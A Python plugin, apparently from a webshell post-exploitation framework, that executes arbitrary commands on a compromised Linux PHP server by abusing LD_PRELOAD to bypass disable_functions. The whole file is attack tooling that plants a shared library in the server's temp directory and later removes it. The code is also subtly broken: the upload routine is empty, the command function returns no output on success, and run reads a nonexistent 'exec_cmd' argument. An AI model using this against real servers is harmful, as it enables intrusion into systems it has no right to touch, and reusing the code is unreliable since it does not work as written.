r'''Execute commands by LD_PRELOAD environment variable on linux for PHP.

The payload is from `https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD`, thanks

'''

from api.exploit import WebshellExploit, Cmdline
from api.webshell import WebshellSession, CommandExecutor, Webshell
from api import Session, logger, tablor, utils
import argparse
import base64
import json

class exploit(WebshellExploit, CommandExecutor):
    
    def __init__(self):
        super().__init__()
        self.parse = argparse.ArgumentParser(prog='exec_by_preload', description="Execute commands by LD_PRELOAD environment variable on linux for PHP.")
        self.parse.add_argument('cmd', help="A command on linux")
        self.help = __doc__+self.parse.format_help()

        self.so_path = None

    def support(self, session: Session)-> bool:
        '''判断当前命令是否支持指定的session， 一般来说session即为运行改命令时的session
        '''
        if isinstance(session, WebshellSession) and session.state['lang'] in (Webshell.PHP, )\
            and 'win' not in session.server_info['os_type'].lower():
            self.session = session
            self.so_path = self.so_path = self.session.server_info['tmpdir']+self.session.server_info['sep']+utils.randomstr(8)
            return True
        return False

    def _upload_so(self, is64bit: bool):
        pass

    def exec_command_on_server(self, cmd: str)-> str:
        self.session.client.options.set_temp_option('timeout', 0)
        ret = self.evalfile('payload', pwd=self.session.state['pwd'], cmd=cmd, sopath=self.so_path)
        if not ret.is_success():
            return None
        ret = json.loads(ret.data)
        if ret['code'] == -1:
            return None
        elif ret['code'] == -2:
            logger.warning("The remote dynamic library path does not exist!")


    def run(self, args: Cmdline)-> int:
        args = self.parse.parse_args(args.options)
        if args.cmd:
            print(self.exec_command_on_server(args.exec_cmd))
        else:
            print(self.parse.format_help())

        return self.SUCCESS

    def hook_destroy(self):
        self.exec_command_on_server(f"rm -f {self.so_path}")